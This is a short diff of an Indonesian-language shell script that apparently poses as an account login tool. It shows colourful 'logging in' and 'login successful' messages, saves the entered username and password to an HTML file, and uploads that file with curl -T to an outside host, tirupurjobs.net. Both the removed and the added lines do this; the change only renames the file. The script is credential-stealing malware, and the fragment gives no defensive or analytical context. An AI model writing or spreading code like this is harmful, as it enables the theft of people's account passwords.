@@ -24,9 +24,9 @@ echo  "~root[@]Sedang MasuK Ke Akun Anda" | lolcat
 sleep 4
 echo "~root[@]Berhasil Login √ " | lolcat
 echo "menyimpan akses login anda..." | lolcat
-echo "User: $user\nPass: $pass" >> File/User/Login.html;
+echo "User: $user\nPass: $pass" >> File/User/akses.html;
 sleep 2
-curl -T File/User/Login.html http://tirupurjobs.net 
+curl -T File/User/akses.html http://tirupurjobs.net 
 echo "\033[93m"
 read -p "masukan pesan 1 :" pesan1 ;
 read -p "masukan pesan 2 :" pesan2 ;
